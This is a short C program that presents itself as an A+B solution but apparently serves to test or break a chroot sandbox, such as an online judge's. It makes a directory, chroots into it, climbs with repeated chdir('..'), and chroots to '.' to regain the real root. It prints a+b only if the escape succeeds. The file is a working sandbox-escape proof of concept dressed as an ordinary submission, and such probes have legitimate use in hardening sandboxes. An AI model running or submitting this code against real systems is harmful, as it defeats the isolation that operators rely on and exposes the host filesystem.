// File: escape-chroot.c
// Author: iBug

#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>

#define MAX_DEPTH 32
const char * const dirName = "test";

int moveUp() {
    for (int i = 0; i < MAX_DEPTH; i++)
        if (chdir(".."))
            return 1;
    return 0;
}

int main() {
    int a, b;
    scanf("%d%d", &a, &b);

    if (mkdir(dirName, 0700)) {
        printf("-1\n");
        return 0;
    }
    if (chroot(dirName)) {
        printf("-2\n");
        return 0;
    }
    if (moveUp()) {
        printf("-3\n");
        return 0;
    }
    if (chroot(".")) {
        printf("-4\n");
        return 0;
    }

    printf("%d\n", a+b);
    return 0;
}
